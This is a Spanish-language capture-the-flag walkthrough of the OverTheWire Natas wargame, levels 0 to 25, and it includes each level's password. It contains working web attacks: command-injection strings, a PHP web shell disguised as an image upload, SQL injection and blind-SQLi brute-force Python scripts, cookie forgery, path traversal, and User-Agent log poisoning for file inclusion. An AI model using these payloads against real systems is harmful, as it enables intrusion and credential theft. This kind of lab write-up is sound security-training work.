# natas0

http://natas0.natas.labs.overthewire.org
natas0
natas0

# natas1

natas1
gtVrDuiDfck831PqWsLEZy5gyDz1clto

# natas2

natas2
ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

# natas3

natas3
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH

# natas4

<!-- No more information leaks!! Not even Google will find it this time... -->

Google: site:natas3.natas.labs.overthewire.org

directory listing - OverTheWire
natas3.natas.labs.overthewire.org/s3cr3t/

Index of /s3cr3t
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[TXT]	users.txt	2016-06-25 12:43 	40 	 
Apache/2.4.7 (Ubuntu) Server at natas3.natas.labs.overthewire.org Port 80

natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

Nota: ojo al `robots.txt`:

```
User-agent: *
Disallow: /s3cr3t/
```

# natas5

 Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

curl --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ -H "Referer:http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

# natas5

tamper data: login=1

 Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

# natas6

http://natas6.natas.labs.overthewire.org/includes/secret.inc

<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>

 Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

# natas7

http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

# natas8

Crear un script que invierta los pasos:

<?php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
print base64_decode(strrev(hex2bin($encodedSecret))) . "\n";
?>

 Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

# natas9

En el cuadro de búsqueda:
asdf; cat /etc/natas_webpass/natas10

Output:

nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

# natas10

En el cuadro de búsqueda:
. /etc/natas_webpass/natas11

/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

Obviamente valdría lo mismo en la anterior :)

# natas11

Pista:
*"Cookies are protected with XOR encryption"*

Mediante tamper data vemos que la cookie "por defecto" es:
`ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=`

Como tenemos la fuente, sabemos que la cookie "protegida" se compone así:

1. json_encode(array con los datos)
2. xor con una clave desconocida
3. base64_encode

Por las propiedades de XOR sabemos que:
`a XOR b = c => a XOR c  = b`

Eso quiere decir que si pasamos los datos cifrados como clave del XOR, tendremos la clave. Para ello basta con modificar ligeramente el código que disponemos:

```
<?php
function xor_encrypt($in) {
    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$default_cookie='ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=';
$d = base64_decode($default_cookie);
print xor_encrypt($d) . "\n";
?>
```

Y ejecutamos:
```
php xor.php
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```

La key es `qw8J`

Ahora, conocida la clave, podemos modificar la cookie a voluntad, indicando `showpassword = yes`

```
<?php
function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$c = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
print base64_encode(xor_encrypt($c)) . "\n";
?>
```

The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

# natas12

Se sube un fichero ".jpg", pero no se verifica (puede ser cualquier cosa, inyección de ficheros). Se guarda con nombre aleatorio en upload/<10chars>.jpg

Sin embargo, nombre y extensión van en un campo *hidden* del formulario; basta con alterarlo (cambiar `.jpg` por `.php`) y ejecutar el fichero subido con este contenido:

<?php
  system("cat /etc/natas_webpass/natas13");
?>

Resultado:
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

# natas13

Muy similar, pero esta vez hay que subir realmente un fichero .jpg. Basta con añadir el código al final y alterar la extensión de la misma manera.

El resutaldo es:
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

# natas14

Inyección SQL

http://natas14.natas.labs.overthewire.org/?debug&username=user%22or%20%221%22=%221&password=asdf%22or%20%221%22=%221&debug

 Executing query: SELECT * from users where username="user"or "1"="1" and password="asdf"or "1"="1"
Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

# natas15

Blind SQL injection. Toca hacer fuerza bruta, mejor con python.

Hago una ñapa con un script en dos pasadas. En la primera, miro qué caracteres hay mediante una consulta like %char%:

```
#!/usr/bin/env python
import requests

# 'username': "natas15"
# 'password': "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

def is_true(p):
    url = "http://natas15.natas.labs.overthewire.org?debug"
    headers = {"Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="}
    payload = {'username': 'natas16" and password like binary "%' + p +'%', 'debug': 'yes'}

    r = requests.post(url, data=payload, headers=headers )

    # print r.text
    if "exists" in r.text:
        return True

# 1st pass
chars = ""
for i in map(chr, range(65, 91) + range(97,123) + range(48, 58)):
   if is_true(i):
       chars = chars + i
print chars
```

Con esto construyo la lista de caracteres que aparecen en la password: `chars = "BEHINORWacehijmnpqtw03569"`

Ahora puedo hacer una segunda pasada iterando por la lista de esos caracteres:

```
#!/usr/bin/env python
import requests

# 'username': "natas15"
# 'password': "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

def is_true(p):
    url = "http://natas15.natas.labs.overthewire.org?debug"
    headers = {"Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="}
    # payload = {'username': 'natas16" and password like binary "%' + p +'%', 'debug': 'yes'}
    payload = {'username': 'natas16" and password like binary "' + p +'%', 'debug': 'yes'}

    r = requests.post(url, data=payload, headers=headers )

    # print r.text
    if "exists" in r.text:
        return True

# 1st pass
# chars = ""
# for i in map(chr, range(65, 91) + range(97,123) + range(48, 58)):
#     if is_true(i):
#         chars = chars + i
# print chars

chars = "BEHINORWacehijmnpqtw03569"
i=1
passwd = ""
while len(passwd) < 32:
    for c in chars:
        if is_true(passwd + c):
            passwd = passwd + c
            print passwd
```

Ejecuto:

W
Wa
WaI
WaIH
WaIHE
WaIHEa
WaIHEac
WaIHEacj
WaIHEacj6
[...]

natas16 : WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

# natas16

Este caso es una complicación de natas9 y natas 10 y se resuelve con una lógica similar al anterior. Se ejecuta un grep más sanitizado pero de la fuente resulta bastante obvio que se puede inyectar código con $(). La grecia está en cómo hacerlo...

grep -i "<texto sanitizado>" dictionary.txt
grep -i "$(echo injections)" dictionary.txt da como resultado "injections"

A partir de ahí podemos empezar a buscar "letra a letra" en el fichero `/etc/natas_webpass/natas17`

`$(grep <c> /etc/natas_webpass/natas17)`

Completo sería:

`grep -i "$(grep <c> /etc/natas_webpass/natas17)injections"` dictionary.txt

¿Por qué se añade injections? Porque si el resultado de $() es nulo, seguirá apareciendo injections como resultado final. Sin embargo, si $() encuentra algo, el resultado final será nulo (porque no hay ningún "prefijo" que añadido a injections de resultado)

A partir de ahí, hay que crear un script similar al del caso anterior.

El resultado es 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

# natas17

http://natas17.natas.labs.overthewire.org/

De nuevo blind injection, esta vez con MySQL. Dado que la url no tiene salida en ningún caso (ver source), habrá que optar de nuevo por la fuerza bruta concatenando un IF ... SLEEP en cada caso. Habrá que tener cuidado con el tiempo de SLEEP, logrando un balance entre que no tarde demasiado tiempo y que no haya errores por lentitud de respuesta.

Ejemplo de parámetro POST:

natas18" and if(1=1, sleep(3), null) #
natas18%22+and+if%281%3D1%2C+sleep%283%29%2C+null%29+%23

Posiblemente debemos usar LIKE y hacer dos pasadas, como en los casos anteriores:

1. La primera para determinar el juego de caracteres

2. La segunda para sacar la contraseña

Así que usaremos de nuevo un script en python (bruta3.py)

Después de unos minutos se obtiene este resultado:

* natas18 : xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

# natas18

Este lo hago de nuevo por fuerza bruta. Sin terminar de analizarlo en detalle, parece que lo único que podemos manupular es la cookie PHPSESSID y que está limitada a un rango de valores bajo, así que...

Ejecuto `bruta4.py`

natas19 : 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

# natas19

Aparentemente similar, pero parece que ya no puede usarse directamente PHPSESSID.

Vamos a ver cómo se genera haciendo unas cuantas llamadas:

```
while true; do curl -s -c - -I -u natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs 'http://natas19.natas.labs.overthewire.org?debug&username=admin&password=asdf'|awk '/Set-Cookie/ {print $2}'|awk -F= '{sub(/;/,""); print $2}'; done
3534362d61646d696e
3433342d61646d696e
3438372d61646d696e
3534382d61646d696e
3336382d61646d696e
3532322d61646d696e
31392d61646d696e
31332d61646d696e
38312d61646d696e
```

El contenido de la cookie tiene toda la pinta de ser ASCII en hexadecimal. Lo decodificamos y... ¡sorpresa!

```
while true; do curl -s -c - -I -u natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs 'http://natas19.natas.labs.overthewire.org?debug&username=admin&password=asdf'|awk '/Set-Cookie/ {print $2}'|awk -F= '{sub(/;/,""); print $2}'|xxd -r -p; echo; done
494-admin
160-admin
616-admin
162-admin
475-admin
15-admin
412-admin
443-admin
542-admin
```

Basta pues con alterar ligeramente el script python del caso anterior para obtener las credenciales buscadas:

natas20 : eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

# natas20

Analizando el código hay alguna pista relevante; para mí, el comentario de "our encoding is better" es decisivo :)

Por la forma en que se tratan los datos de sesión, parece claro que se trata de inyectar una cadena de la forma "\nadmin 1" en el campo `name`. Podemos hacerlo con `curl`:

Hay que tener solo un par de precaciones:

* fijar el nombre de la cookie de sesión
* Codificar bien la URL

Y lo tenemos así:

```
curl --cookie "PHPSESSID=ojoooooo" -u natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF 'http://natas20.natas.labs.overthewire.org?name=admin%0Aadmin%201'
```

Con eso el fichero está escrito; hacemos una segunda llamada -con esa sesión- para leerlo:

```
curl --cookie "PHPSESSID=ojoooooo" -u natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF 'http://natas20.natas.labs.overthewire.org'
[...]
You are an admin. The credentials for the next level are:<br><pre>Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ</pre>
```

# natas21

Este es casi trivial. El sitio "principal" no da muchas opciones, pero comparte "sesiones" con otr que sí nos deja añadir entradas.
Controlando el PHPSESSID como en el caso anterior, basta con añadir admin=1 como parámetro de POST con tamper data.
Luego, con el mismo PHPSESSID, leemos los datos en la otra URL:

```
curl --cookie "PHPSESSID=ojoooooo" -u natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ 'http://natas21-experimenter.natas.labs.overthewire.org/index.php?submit=update&admin=1'
curl --cookie "PHPSESSID=ojoooooo" -u natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ 'http://natas21.natas.labs.overthewire.org'

The credentials for the next level are:<br><pre>Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ</pre>
```

# natas22

Sorprendentemente sencillo, basta con añadir ?revelio en el GET. Luego he visto que hay una complicación (una redirección) que se vence, por ejemplo, usando curl (que es lo que yo había usado por casualidad desde el principio)

Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE

# natas23

Esta vuelve a ser casi trivial leyendo el source:

http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou

Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg

# natas24

Este es tremendo O_o. La única operación que hay en la fuente es un strcmp y lo que podemos controlar es la password que pasamos por GET/POST.

Buscando en Google hay un documento sobre "type juggling" (https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf) que da la pista necesaria: hacer fallar el strcmp enviando... ¡un array! Este comportamiento está también documentado en https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet.

En consecuencia:

```
http://natas24.natas.labs.overthewire.org/?passwd[]=foo

 Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23

The credentials for the next level are:

Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
```

# natas25

Por una parte tenemos un fichero en el que se escribe el HTTP_USER_AGENT (y, por tanto, lo que queramos). Por otra una inclusión de fichero con una sanitización insuficiente del path. La gracia es juntar las dos cosas:

* Inyectar código en el log que lea el fichero de passwords
* Mostrar el log

De un tirón y sin más explicación:
`curl -q --cookie "PHPSESSID=ojoooooo" -H "User-agent: <?php echo file_get_contents('/etc/natas_webpass/natas26'); php?>" -u natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c "http://natas25.natas.labs.overthewire.org?lang=..././..././..././..././..././tmp/natas25_ojoooooo.log`

Entr los errores tenemos la cadena buscada: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T

# natas26
